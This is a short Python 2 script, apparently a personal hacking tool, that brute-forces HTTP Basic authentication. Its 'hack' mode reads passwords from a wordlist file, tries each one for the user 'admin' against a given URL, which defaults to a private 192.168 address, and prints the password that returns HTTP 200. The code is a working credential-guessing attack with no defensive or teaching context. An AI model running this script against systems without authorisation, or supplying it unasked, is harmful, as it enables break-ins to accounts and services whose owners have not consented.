#!/usr/bin/python
#coding=utf8
#filename=web_auth_base_http.py
#date:20130608-2000
'''
'''
import urllib
import urllib2
import base64
import time
import os
import sys

user_agent = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
username = 'admin'
#headers = {'User-Agent':user_agent}
#headers['Authorization'] = base64.b64encode(username+":"+password)

def hack_web(Url, User, Passwd, Agent):
    Headers = {'User-Agent':Agent, \
   'Authorization': \
   "Basic "+base64.b64encode(User+":"+Passwd)}
    req = urllib2.Request(url=Url, headers=Headers)
    #print Headers
    #print User," ", Passwd
    try:
        respon = urllib2.urlopen(req)
    except (urllib2.HTTPError, urllib2.URLError),e:
        #print e   """for debug"""
        return
    return respon

def access_web(Url, Agent):
    Headers = {'User-Agent':Agent}
    req = urllib2.Request(url=Url, headers=Headers)
    try:
        respon = urllib2.urlopen(req)
    except (urllib2.HTTPError, urllib2.URLError), e:
        print e
        return
    return respon

if len(sys.argv) > 1:
    if len(sys.argv) > 2:
        url = sys.argv[2]
    else:
        url = "http://192.168.192.168:8844/"

else:
    print "%s <args1> <args2>" % sys.argv[0]
    exit(-1)

if sys.argv[1] == "hack":
    if sys.argv[3]:
        pwd_f = open(sys.argv[3])
        pwd_f_1line = iter(pwd_f)
    while True:
        pwd_tmp = pwd_f_1line.next().strip()
        response = hack_web(Url=url, User=username, Passwd=pwd_tmp, Agent=user_agent)
        if response:
            if response.getcode() == 200:
                print "yes,%s" % (pwd_tmp)
               	exit(0)
            else:
                 print "result", response, ", pwd:", pwd_tmp
        else:
            print "not find"

elif sys.argv[1] == "access":
    response = access_web(Url=url, Agent=user_agent)
    if response:
        print response.getcode()

